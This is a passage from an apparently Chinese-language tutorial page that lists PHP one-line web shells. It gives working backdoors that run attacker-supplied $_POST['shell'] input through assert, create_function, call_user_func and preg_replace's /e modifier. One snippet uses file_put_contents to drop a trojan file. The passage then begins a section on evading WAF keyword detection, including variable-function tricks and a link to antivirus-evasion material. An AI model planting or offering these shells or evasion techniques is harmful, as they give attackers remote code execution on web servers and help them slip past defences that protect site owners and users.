&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt; &lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-info z-php&quot;&gt;assert&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;create-function&quot;&gt;&lt;code&gt;create_function&lt;&#x2F;code&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#create-function&quot; aria-label=&quot;Anchor link for: create-function&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;fun&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-funchand z-php&quot;&gt;create_function&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-php&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-invoke z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;fun&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;call-user-func-hui-diao-han-shu&quot;&gt;&lt;code&gt;call_user_func&lt;&#x2F;code&gt; 回调函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#call-user-func-hui-diao-han-shu&quot; aria-label=&quot;Anchor link for: call-user-func-hui-diao-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt; &lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-funchand z-php&quot;&gt;call_user_func&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-constant z-other z-php&quot;&gt;assert&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-php&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;call_user_func&lt;&#x2F;code&gt; 函数的第一个参数调用其他函数，第二个参数为该调用函数传参。一些被waf拦截的的可配合这个函数绕过waf。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;preg-replace&quot;&gt;&lt;code&gt;preg_replace&lt;&#x2F;code&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#preg-replace&quot; aria-label=&quot;Anchor link for: preg-replace&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-php_pcre z-php&quot;&gt;preg_replace&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-meta z-string z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-regex-delimiter z-begin z-php&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-regexp z-php&quot;&gt;abcde&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-regex-delimiter z-end z-php&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-regex z-modifier z-php&quot;&gt;e&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-php&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-php&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;abcdefg&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;该函数利作用是使用正则表达式替换符合条件的字符串，但该函数可执行命令。函数的第一个参数是正则表达式，按照 PHP 的格式，表达式在&lt;code&gt;&#x2F;&lt;&#x2F;code&gt;间，若在&lt;code&gt;&#x2F;&lt;&#x2F;code&gt;末尾加 &lt;code&gt;e&lt;&#x2F;code&gt;，这个函数的第二个参数就会被当作代码执行。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;file-put-contents&quot;&gt;&lt;code&gt;file_put_contents&lt;&#x2F;code&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#file-put-contents&quot; aria-label=&quot;Anchor link for: file-put-contents&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;test&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-comparison z-php&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;?&lt;span class=&quot;z-constant z-other z-php&quot;&gt;php&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-info z-php&quot;&gt;assert&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;@file_put_contents(&amp;quot;Biu.php,$test&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;利用函数生成木马文件，第一个参数是文件名，第二个参数是文件内容&lt;&#x2F;p&gt;
&lt;h1 id=&quot;yi-ju-hua-mu-ma-rao-guo-waf&quot;&gt;一句话木马绕过waf&lt;a class=&quot;zola-anchor&quot; href=&quot;#yi-ju-hua-mu-ma-rao-guo-waf&quot; aria-label=&quot;Anchor link for: yi-ju-hua-mu-ma-rao-guo-waf&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h1&gt;
&lt;p&gt;WAF （Web 应用防火墙）用于保护 Web 应用不被各类应用层攻击,如跨站脚本(XSS)、SQL注入、cookie中毒等，通常以关键字判断是否为一句话木马。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;本节仅是绕过一些基础的关键字查杀 WAF，更多免杀请产考：&lt;&#x2F;strong&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9246&quot;&gt;免杀&#x2F;一句话木马(PHP)&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;bian-liang-han-shu&quot;&gt;变量函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#bian-liang-han-shu&quot; aria-label=&quot;Anchor link for: bian-liang-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;变量函数(可变函数)&lt;&#x2F;strong&gt; : 变量名后有圆括号，PHP将寻找与变量的值同名的函数，并尝试执行。&lt;strong&gt;即使用变量作为函数名的函数&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;注意: eval是一个语言构造器而不是一个函数，不能被变量函数调用。&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
